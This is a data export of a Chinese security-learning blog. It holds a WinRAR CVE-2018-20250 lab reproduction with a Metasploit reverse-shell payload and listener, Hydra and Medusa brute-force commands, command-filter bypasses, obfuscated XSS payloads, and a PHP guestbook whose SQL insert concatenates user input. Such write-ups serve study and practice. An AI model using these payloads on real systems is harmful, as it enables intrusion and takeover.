函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 1mysql_fetch_array(data,array_type) 1mysql_fetch_array($result) 4.6SELECTSELECT 语句用于从数据库中选取数据。 1234SELECT column_name,column_nameFROM table_name;SELECT * FROM table_name; 1SELECT * FROM `all_messages`; 4.7INSERT INTO SELECTINSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个已存在的表中。 1234567INSERT INTO table2SELECT * FROM table1;INSERT INTO table2(column_name(s))SELECT column_name(s)FROM table1; 1INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;&quot;.$u.&quot;&apos;,&apos;&quot;.$t.&quot;&apos;,&apos;&quot;.$c.&quot;&apos;) 5.缺陷1.没有删除功能。 2.刷新页面时表单会重复提交。 3.时间显示不正确。 1234567891011121314151617181920212223242526272829303132333435363738/*date()函数参数*/d - 一个月中的第几天（从 01 到 31）D - 星期几的文本表示（用三个字母表示）j - 一个月中的第几天，不带前导零（1 到 31）l（&apos;L&apos; 的小写形式）- 星期几的完整的文本表示N - 星期几的 ISO-8601 数字格式表示（1表示Monday[星期一]，7表示Sunday[星期日]）S - 一个月中的第几天的英语序数后缀（2 个字符：st、nd、rd 或 th。与 j 搭配使用）w - 星期几的数字表示（0 表示 Sunday[星期日]，6 表示 Saturday[星期六]）z - 一年中的第几天（从 0 到 365）W - 用 ISO-8601 数字格式表示一年中的星期数字（每周从 Monday[星期一]开始）F - 月份的完整的文本表示（January[一月份] 到 December[十二月份]）m - 月份的数字表示（从 01 到 12）M - 月份的短文本表示（用三个字母表示）n - 月份的数字表示，不带前导零（1 到 12）t - 给定月份中包含的天数L - 是否是闰年（如果是闰年则为 1，否则为 0）o - ISO-8601 标准下的年份数字Y - 年份的四位数表示y - 年份的两位数表示a - 小写形式表示：am 或 pmA - 大写形式表示：AM 或 PMB - Swatch Internet Time（000 到 999）g - 12 小时制，不带前导零（1 到 12）G - 24 小时制，不带前导零（0 到 23）h - 12 小时制，带前导零（01 到 12）H - 24 小时制，带前导零（00 到 23）i - 分，带前导零（00 到 59）s - 秒，带前导零（00 到 59）u - 微秒（PHP 5.2.2 中新增的）e - 时区标识符（例如：UTC、GMT、Atlantic/Azores）I（i 的大写形式）- 日期是否是在夏令时（如果是夏令时则为 1，否则为 0）O - 格林威治时间（GMT）的差值，单位是小时（实例：+0100）P - 格林威治时间（GMT）的差值，单位是 hours:minutes（PHP 5.1.3 中新增的）T - 时区的简写（实例：EST、MDT）Z - 以秒为单位的时区偏移量。UTC 以西时区的偏移量为负数（-43200 到 50400）c - ISO-8601 标准的日期（例如 2013-05-05T16:34:42+00:00）r - RFC 2822 格式的日期（例如 Fri, 12 Apr 2013 12:01:05 +0200）U - 自 Unix 纪元（January 1 1970 00:00:00 GMT）以来经过的秒数 将上面代码中的h改成H即为24小时 1date(&quot;Y-m-d H:i:s&quot;,time()) 时区设置在php.ini中搜索”timezone”修改 6.参考[1] php留言板製作 [2] PHP 教程 [3] SQL 教程","categories":[],"tags":[]},{"title":"'Kali使用shellinabox，并使用Ngrok将shellinabox映射到外网'","slug":"Kail-Use-Shellinabox&Ngrok","date":"2019-03-21T11:49:19.000Z","updated":"2019-03-25T12:19:28.357Z","comments":true,"path":"2019/03/21/Kail-Use-Shellinabox&Ngrok/","link":"","permalink":"https://chirec.github.io/2019/03/21/Kail-Use-Shellinabox&Ngrok/","excerpt":"1.shellinabox介绍Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统http://IP:4200，在启用了SSL/TLS证书，需要用http://IP:4200来登录。默认情况下shellinabox使用的是4200端口。 2.shellinabox安装使用的是系统是Kali Linux 2019，在终端输入 1apt install shellinabox 如果提示无法找到包，请添加国内更新源 123456789gedit /etc/apt/sources.list//添加下列更新源#清华大学 [更新源]deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙江大学[更新源]deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free","text":"1.shellinabox介绍Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统http://IP:4200，在启用了SSL/TLS证书，需要用http://IP:4200来登录。默认情况下shellinabox使用的是4200端口。 2.shellinabox安装使用的是系统是Kali Linux 2019，在终端输入 1apt install shellinabox 如果提示无法找到包，请添加国内更新源 123456789gedit /etc/apt/sources.list//添加下列更新源#清华大学 [更新源]deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙江大学[更新源]deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free 3.shellinabox参数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859List of command line options: -b, --background[=PIDFILE] run in background -c, --cert=CERTDIR set certificate dir (default: $PWD) --cert-fd=FD set certificate file from fd --css=FILE attach contents to CSS style sheet --cgi[=PORTMIN-PORTMAX] run as CGI -d, --debug enable debug mode -f, --static-file=URL:FILE serve static file from URL path -g, --group=GID switch to this group (default: nogroup) -h, --help print this message --linkify=[none|normal|aggressive] default is &quot;normal&quot; --localhost-only only listen on 127.0.0.1 --no-beep suppress all audio output -n, --numeric do not resolve hostnames -m, --messages-origin=ORIGIN allow iframe message passing from origin --pidfile=PIDFILE publish pid of daemon process -p, --port=PORT select a port (default: 4200) -s, --service=SERVICE define one or more services -t, --disable-ssl disable transparent SSL support --disable-ssl-menu disallow changing transport mode --disable-utmp-logging disable logging to utmp and wtmp -q, --quiet turn off all messages --unixdomain-only=PATH:USER:GROUP:CHMOD listen on unix socket -u, --user=UID switch to this user (default: nobody) --user-css=STYLES defines user-selectable CSS options -v, --verbose enable logging messages --version prints version information --disable-peer-check disable peer check on a sessionDebug, quiet, and verbose are mutually exclusive.One or more --service arguments define services that should be made availablethrough the web interface: SERVICE := &lt;url-path&gt; &apos;:&apos; APP APP := &apos;LOGIN&apos; | &apos;SSH&apos; [ : &lt;host&gt; ] | USER &apos;:&apos; CWD &apos;:&apos; CMD USER := &apos;AUTH&apos; | &lt;username&gt; &apos;:&apos; &lt;groupname&gt; CWD := &apos;HOME&apos; | &lt;dir&gt; CMD := &apos;SHELL&apos; | &lt;cmdline&gt;&lt;cmdline&gt; supports variable expansion: $&#123;columns&#125; - number of columns $&#123;gid&#125; - gid id $&#123;group&#125; - group name $&#123;home&#125; - home directory $&#123;lines&#125; - number of rows $&#123;peer&#125; - name of remote peer $&#123;realip&#125; - value of HTTP header field &apos;X-Real-IP&apos; $&#123;uid&#125; - user id $&#123;url&#125; - the URL that serves the terminal session $&#123;user&#125; - user nameOne or more --user-css arguments define optional user-selectable CSS options.These options show up in the right-click context menu: STYLES := GROUP &#123; &apos;;&apos; GROUP &#125;* GROUP := OPTION &#123; &apos;,&apos; OPTION &#125;* OPTION := &lt;label&gt; &apos;:&apos; [ &apos;-&apos; | &apos;+&apos; ] &lt;css-file&gt;OPTIONs that make up a GROUP are mutually exclusive. But individual GROUPs areindependent of each other. 12345678-b,--background[=PIDFILE] 后台运行-c, --cert=CERTDIR 指定证书目录（默认当前工作路径）-p, --port=PORT 更改端口 (默认: 4200)-t, --disable-ssl 关闭SSL传输-q, --quiet 安静模式，禁用所有信息-u, --user=UID 设置登录用户 (默认: nobody)-v, --verbose 开启登录信息提示--version 显示版本信息 4.shellinabox启动1shellinaboxd -b -t 启动服务之后，在浏览器访问http://IP:4200默认4200端口，可以自己修改shellinabox默认禁止root登陆，所以Kali系统需要新建一个用户登录 5.使用Ngrok将服务映射到外网5.1建立隧道在Ngrok建立隧道，注意本地端口填写启动shellinabox的端口 5.2开启映射123unzip linux_amd64.zipcd /Desktop/linux_amd64./sunny clientid 隧道id 5.3通过外网登陆直接输入URL即可登录","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'Medusa和Hydra对比'","slug":"Brief-Introduction-on-Medusa&Hydra","date":"2019-03-18T11:51:27.000Z","updated":"2019-03-25T12:19:37.821Z","comments":true,"path":"2019/03/18/Brief-Introduction-on-Medusa&Hydra/","link":"","permalink":"https://chirec.github.io/2019/03/18/Brief-Introduction-on-Medusa&Hydra/","excerpt":"1.介绍1.1Hydra Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system. THIS TOOL IS FOR LEGAL PURPOSES ONLY! There are already several login hacker tools available, however, none does either support more than one protocol to attack or support parallized connects. It was tested to compile cleanly on Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS. Currently this tool supports the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP. However the module engine for new services is very easy so it won’t take a long time until even more services are supported. Your help in writing, enhancing or fixing modules is highly appreciated!! :-) 1.2Medusa Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application: Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently. Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be either a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing. Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing. Multiple protocols supported. Many services are currently supported (e.g. SMB, HTTP, POP3, MS-SQL, SSHv2, among others). Application stability. Maybe I’m just lame, but Hydra frequently crashed on me. I was no longer confident that Hydra was actually doing what it claimed to be. Rather than fix Hydra, I decided to create my own buggy application which could crash in new and exciting ways.","text":"1.介绍1.1Hydra Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system. THIS TOOL IS FOR LEGAL PURPOSES ONLY! There are already several login hacker tools available, however, none does either support more than one protocol to attack or support parallized connects. It was tested to compile cleanly on Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS. Currently this tool supports the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP. However the module engine for new services is very easy so it won’t take a long time until even more services are supported. Your help in writing, enhancing or fixing modules is highly appreciated!! :-) 1.2Medusa Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application: Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently. Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be either a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing. Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing. Multiple protocols supported. Many services are currently supported (e.g. SMB, HTTP, POP3, MS-SQL, SSHv2, among others). Application stability. Maybe I’m just lame, but Hydra frequently crashed on me. I was no longer confident that Hydra was actually doing what it claimed to be. Rather than fix Hydra, I decided to create my own buggy application which could crash in new and exciting ways. 2.参数介绍2.1Hydra 123456789101112131415161718192021222324252627hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]-R 恢复上一次的会话-I 忽略存在的恢复文件-S SSL连接-s 端口号-l 尝试登陆名-L 从文件中导入登录名-p 尝试密码-P 从文件中导入密码-e nsr n尝试空密码 s尝试与用户名相同的密码 r反向登陆循环-c TIME 设置尝试登陆等待时间-4 / -6 使用IPV4地址或IPV6地址-v / -V 详细信息模式/显示每次尝试的用户名+密码/调试模式-O 使用旧版本SSL v2和v3-q 不显示连接错误信息-h 帮助-M 从文件中导入服务类型-f / -F 在找到第一个账号/密码后，停止破解server 目标IPservice 支持的服务类型支持的服务类型：adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmppExamples：hydra -l user -P passlist.txt ftp://192.168.0.1 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5 hydra -l admin -p password ftp://[192.168.0.0/24]/ hydra -L logins.txt -P pws.txt -M targets.txt ssh 2.2Medusa 1234567891011121314151617181920212223242526Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]-h [TEXT] 目标IP-H [FILE] 目标主机文件-u [TEXT] 用户名-U [FILE] 用户名文件-p [TEXT] 密码-P [FILE] 密码文件-C [FILE] 组合条目文件-O [FILE] 文件日志信息-e [n/s/ns] N意为空密码，S意为密码与用户名相同-M [TEXT] 模块执行名称-m [TEXT] 传递参数到模块-d 显示所有的模块名称-n [NUM] 使用非默认端口-s 启用SSL-r [NUM] 重试间隔时间，默认为3秒-t [NUM] 设定线程数量-L 并行化，每个用户使用一个线程-f 在找到第一个账号/密码后，停止破解-q 显示模块的使用信息-v [NUM] 详细级别（0-6详细）-w [NUM] 错误调试级别（0-10）-V 显示版本-Z [TEXT] 继续扫描上一次Example：medusa -M ssh -u root -P passwd.txt -h 192.168.126.130 -f -v 6 3.实验3.1暴力破解SSH3.1.1Hydra1hydra -l chessur -P passwd.txt ssh://192.168.126.130 3.1.2Medusa1medusa -M ssh -u chessur -P passwd.txt -h 192.168.126.130 -F -v 6 3.2暴力破解FTP3.2.1Hydra1hydra -l ftp1 -P passwd.txt ssh://192.168.126.130 3.2.2Medusa1medusa -M ftp -u ftp1 -P passwd.txt -h 192.168.126.130 -f -v 6 4.总结1.Medusa比Hydra稳定，但是破解速度比较慢。 2.SSH尝试速度比FTP尝试速度慢。 3.Medusa支持参数和服务类型比Hydra少，可能是很久不更新的原因。 5.参考[1] thc-hydra-README [2] Medusa Parallel Network Login Auditor","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'WinRAR目录穿越漏洞复现（CVE-2018-20250）'","slug":"Writeup-on-CVE-2018-20250","date":"2019-03-15T11:25:33.000Z","updated":"2019-03-24T07:50:57.816Z","comments":true,"path":"2019/03/15/Writeup-on-CVE-2018-20250/","link":"","permalink":"https://chirec.github.io/2019/03/15/Writeup-on-CVE-2018-20250/","excerpt":"1.漏洞细节 https://research.checkpoint.com/extracting-code-execution-from-winrar/ 2.漏洞影响版本 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.漏洞复现环境 角色 系统版本 IP 备注 靶机 Windows7（64bit） 192.168.126.128 安装WinRAR版本为5.6.1，关闭防火墙 攻击机 Kali Linux 64 Bit 2019.1a 192.168.126.126 Metasploit版本为5.0.2 攻击机 WIndows10（64bit） 安装Python3.7.2 exp下载：https://github.com/WyAtu/CVE-2018-20250/","text":"1.漏洞细节 https://research.checkpoint.com/extracting-code-execution-from-winrar/ 2.漏洞影响版本 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.漏洞复现环境 角色 系统版本 IP 备注 靶机 Windows7（64bit） 192.168.126.128 安装WinRAR版本为5.6.1，关闭防火墙 攻击机 Kali Linux 64 Bit 2019.1a 192.168.126.126 Metasploit版本为5.0.2 攻击机 WIndows10（64bit） 安装Python3.7.2 exp下载：https://github.com/WyAtu/CVE-2018-20250/ 4.漏洞复现过程4.1使用Metasploit5生成免杀Payload123456789msfconsoleuse evasion/windows/windows_defender_exeshow infoset filename WinRAR.exeset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.126.126set lport 10260run 4.2使用exp生成恶意程序12345cd /root/Desktopgit clone https://github.com/WyAtu/CVE-2018-20250.gitcd CVE-2018-20250cp /root/.msf4/local/WinRAR.exe ./vim exp.py 将exp.py中的evil_filename = “calc.exe”改为”WinRAR.exe” 将CVE-2018-20250文件夹复制到Windows10中，执行 1python exp.py 生成恶意程序test.rar 4.3在靶机上运行恶意程序将test.rar复制到Windows7上，解压运行 4.4在Kali Linux上执行Metasploit监听1234567msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.126.126set lport 10260run 4.5控制靶机Windows7重启之后，Kali Linux会收到会话，此时执行shell即可获得靶机权限。 5.总结刚刚学了2个星期的渗透测试，仅仅做了漏洞复现，没有分析漏洞原理。 6.参考文章[1] Extracting a 19 Year Old Code Execution from WinRAR [2] WinRAR目录穿越漏洞浅析及复现（CVE-2018-20250） [3] WinRAR远程代码执行漏洞结合Metasploit+Ngrok实现远程上线","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://chirec.github.io/tags/漏洞复现/"}]},{"title":"'Hexo+GitHub搭建Blog过程'","slug":"How-to-Creat-a-Blog-with-Hexo&GitHub","date":"2019-03-14T12:43:46.000Z","updated":"2019-05-13T06:00:57.040Z","comments":true,"path":"2019/03/14/How-to-Creat-a-Blog-with-Hexo&GitHub/","link":"","permalink":"https://chirec.github.io/2019/03/14/How-to-Creat-a-Blog-with-Hexo&GitHub/","excerpt":"1.安装环境1.安装Node.js：在Node.js官网下载最新版本 2.安装Git for Windows：在git官网下载，选择Windows 3.安装cmder：在cmder官网下载，Git Bash并不好用，所以选择使用cmder 4.配置环境变量：需要配置环境变量的有cmder、Git、Node.js。找到安装地址复制路径，右击我的电脑-属性-点击左边高级系统设置-点击环境变量-在下方系统变量中找到Path点击编辑，然后新建-添加环境变量，三个环境变量都添加之后点击确定。这里提供添加完环境变量的图片 2.创建GitHub博客新建一个名为 用户名.github.io的仓库。例如，我的GitHub用户名是ChireC，那么我创建的仓库名就是ChireC.github.io，将来的Blog地址就是https://chirec.github.io/。 注意，Username和name并不一样。","text":"1.安装环境1.安装Node.js：在Node.js官网下载最新版本 2.安装Git for Windows：在git官网下载，选择Windows 3.安装cmder：在cmder官网下载，Git Bash并不好用，所以选择使用cmder 4.配置环境变量：需要配置环境变量的有cmder、Git、Node.js。找到安装地址复制路径，右击我的电脑-属性-点击左边高级系统设置-点击环境变量-在下方系统变量中找到Path点击编辑，然后新建-添加环境变量，三个环境变量都添加之后点击确定。这里提供添加完环境变量的图片 2.创建GitHub博客新建一个名为 用户名.github.io的仓库。例如，我的GitHub用户名是ChireC，那么我创建的仓库名就是ChireC.github.io，将来的Blog地址就是https://chirec.github.io/。 注意，Username和name并不一样。 3.配置SSH key运行之前安装好的cmder，输入以下命令创建SSH密钥 1ssh-keygen -t rsa -C 邮件地址 执行命令后，点击三次Enter，会生成一个名为.ssh的文件夹在用户目录下，使用记事本打开文件夹中的id_rsa.pub文件，将文件内容复制，打开GitHub主页，点击右上方头像，再点击下拉菜单中的Setting，点击左侧菜单中的SSH and GPG keys，点击右边的绿色New SSH key按钮添加新的SSH kye 在Key中粘贴刚刚复制的内容，点击下方绿色Add SSH key按钮，即可完成配置SSH key。 回到cmder中，输入以下命令测试是否成功配置SSH key 1ssh -T git@github.com 提示Are you sure you want to continue connecting (yes/no)，输入yes，若看到 Hi username！You’ve successfully authenticated, but GitHub does not provide shell access. 则表示成功配置SSH key。 再输入以下命令进一步配置： 12git config --global user.name username //username即为用户名git config --global user.email email //email为创建GitHub时的邮箱 4.安装Hexo首先，在你的硬盘中创建一个存放你自己Blog文件的文件夹，如D:\\Blog，然后在cmder中输入以下代码： 1234567d: //跳转盘符cd Blog //跳转到存放Blog文件的文件夹npm install -g hexo //安装hexonpm install hexo-deployer-git --save //安装上传服务hexo init //初始化hexo g //生成Blog文件hexo s //启动服务 执行hexo s后，可以在本地预览Blog，打开浏览器访问http://localhost:4000即可查看内容。 修改主题，首先打开cmder，然后输入以下命令，以hexo-theme-yilia为例： 12cd Bloggit clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 下载的主题会存在Blog文件夹下的themes文件下，将Blog文件夹下的_config.yml中的theme: landscape改为theme: yilia，然后执行hexo g重新生成。 5.上传到GitHub更改配置文件_config.yml中deploy选项： 1234deploy: type: git repository: git@github.com:username/username.github.io.git branch: master 更改完成之后，在cmder中输入： 1hexo d 即可将Blog上传到GitHub。 6.写博客打开cmder，跳转到Blog的根目录，执行命令： 1hexo new &apos;name&apos; 执行成功后，会显示生成的md文件的位置，打开这个文件即可开始编写Blog，我使用的是Typora进行编写。 7.在Hexo中插入图片首先，在_config.yml中，将post_asset_folder改为true，这样设置之后，当我们执行 1hexo new &apos;New Page&apos; 后，会创建一个和文章名相同的文件夹，将要插入的图片放进这个文件夹中，图片名称不要太长，太长似乎不会正确显示。 7.1使用插件hexo-asset-image插入图片安装hexo插件 1npm install hexo-asset-image --save 安装插件之后，在生成静态页面时，插件会更新正确的图片link 使用Typora编写markdown时，可以在文件-偏好设置-图片插入-复制到指定目录中输入./${filename}就可以直接将图片放到之前生成的文件夹中 7.2使用标签插入图片1&#123;% asset_img 图片名 图片解释 %&#125; 即可插入图片 8.重装系统后再次使用Hexo重装系统之后，之前的一些设置会丢失，再次执行一遍命令即可。需要再完成一遍的步骤有安装Node.js、安装Git、配置SSH key、安装Hexo。安装Hexo这一步，若之前博客的文件夹还存在只需要执行 1234d: //跳转盘符cd Blog //跳转到存放Blog文件的文件夹npm install -g hexo //安装hexonpm install hexo-deployer-git --save //安装上传服务 若之前的博客不存在了，就要执行hexo初始化 1hexo init 完成之后，就可以继续写博客了。注：一定要及时备份博客的source文件夹、_config.yml、themes文件夹。source文件夹中是md格式的文章，另外两个则是整个博客的配置文件和主题样式。 9.参考文章[1] 使用hexo+github搭建免费个人博客详细教程 [2] hexo博客图片问题 [3] 开始使用-NexT 使用文档 [4] Hexo","categories":[],"tags":[]},{"title":"'Notes'","slug":"Notes","date":"2009-12-31T11:41:10.000Z","updated":"2019-05-14T13:42:11.020Z","comments":true,"path":"2009/12/31/Notes/","link":"","permalink":"https://chirec.github.io/2009/12/31/Notes/","excerpt":"","text":"CTF流程1.查看源代码2.查看robots.txt linux下空格绕过1234cat flag.txtcat$&#123;IFS&#125;flag.txtcat$IFS$9flag.txtcat&lt;flag.txt ${IFS} Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substitution. PHP is_numeric 绕过使用十六进制绕过 outguess1outguess -r picture text Linuxpython导入bash 1python -c &apos;import pty;pty.spawn(&quot;/bin/sh&quot;)&apos; 设置ssh使用root登录 123vim /etc/ssh/sshd_configPasswordAuthentication yesPermitRootLogin yes 开机启动ssh服务 1update-rc.d ssh enable bash_history 复制粘贴 1234复制命令：Ctrl + Shift + C粘贴命令：Ctrl + Shift + V复制命令：Ctrl|Shift + Insert|用鼠标选中粘贴命令：Crtl|Shift + Insert|单击鼠标滚轮 1ctrl + 鼠标选中后粘贴会立即执行 XSSpayload1javascrip&amp;#x0000000074:alert(1) &amp;#x0000空子节 1&lt;script&gt;$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.__$+&quot;)&quot;+&quot;\\&quot;&quot;)())()&lt;/script&gt; url转码 1%3C%73%63%72%69%70%74%3E%24%3D%7E%5B%5D%3B%24%3D%7B%5F%5F%5F%3A%2B%2B%24%2C%24%24%24%24%3A%28%21%5B%5D%2B%22%22%29%5B%24%5D%2C%5F%5F%24%3A%2B%2B%24%2C%24%5F%24%5F%3A%28%21%5B%5D%2B%22%22%29%5B%24%5D%2C%5F%24%5F%3A%2B%2B%24%2C%24%5F%24%24%3A%28%7B%7D%2B%22%22%29%5B%24%5D%2C%24%24%5F%24%3A%28%24%5B%24%5D%2B%22%22%29%5B%24%5D%2C%5F%24%24%3A%2B%2B%24%2C%24%24%24%5F%3A%28%21%22%22%2B%22%22%29%5B%24%5D%2C%24%5F%5F%3A%2B%2B%24%2C%24%5F%24%3A%2B%2B%24%2C%24%24%5F%5F%3A%28%7B%7D%2B%22%22%29%5B%24%5D%2C%24%24%5F%3A%2B%2B%24%2C%24%24%24%3A%2B%2B%24%2C%24%5F%5F%5F%3A%2B%2B%24%2C%24%5F%5F%24%3A%2B%2B%24%7D%3B%24%2E%24%5F%3D%28%24%2E%24%5F%3D%24%2B%22%22%29%5B%24%2E%24%5F%24%5D%2B%28%24%2E%5F%24%3D%24%2E%24%5F%5B%24%2E%5F%5F%24%5D%29%2B%28%24%2E%24%24%3D%28%24%2E%24%2B%22%22%29%5B%24%2E%5F%5F%24%5D%29%2B%28%28%21%24%29%2B%22%22%29%5B%24%2E%5F%24%24%5D%2B%28%24%2E%5F%5F%3D%24%2E%24%5F%5B%24%2E%24%24%5F%5D%29%2B%28%24%2E%24%3D%28%21%22%22%2B%22%22%29%5B%24%2E%5F%5F%24%5D%29%2B%28%24%2E%5F%3D%28%21%22%22%2B%22%22%29%5B%24%2E%5F%24%5F%5D%29%2B%24%2E%24%5F%5B%24%2E%24%5F%24%5D%2B%24%2E%5F%5F%2B%24%2E%5F%24%2B%24%2E%24%3B%24%2E%24%24%3D%24%2E%24%2B%28%21%22%22%2B%22%22%29%5B%24%2E%5F%24%24%5D%2B%24%2E%5F%5F%2B%24%2E%5F%2B%24%2E%24%2B%24%2E%24%24%3B%24%2E%24%3D%28%24%2E%5F%5F%5F%29%5B%24%2E%24%5F%5D%5B%24%2E%24%5F%5D%3B%24%2E%24%28%24%2E%24%28%24%2E%24%24%2B%22%5C%22%22%2B%24%2E%24%5F%24%5F%2B%28%21%5B%5D%2B%22%22%29%5B%24%2E%5F%24%5F%5D%2B%24%2E%24%24%24%5F%2B%22%5C%5C%22%2B%24%2E%5F%5F%24%2B%24%2E%24%24%5F%2B%24%2E%5F%24%5F%2B%24%2E%5F%5F%2B%22%28%22%2B%24%2E%5F%5F%24%2B%22%29%22%2B%22%5C%22%22%29%28%29%29%28%29%3C%2F%73%63%72%69%70%74%3E 123&lt;script&gt;eval(&apos;\\x76\\x61\\x72\\40\\141\\75String.fromCharCode(49);\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028a\\u0029;&apos;)&lt;/script&gt; 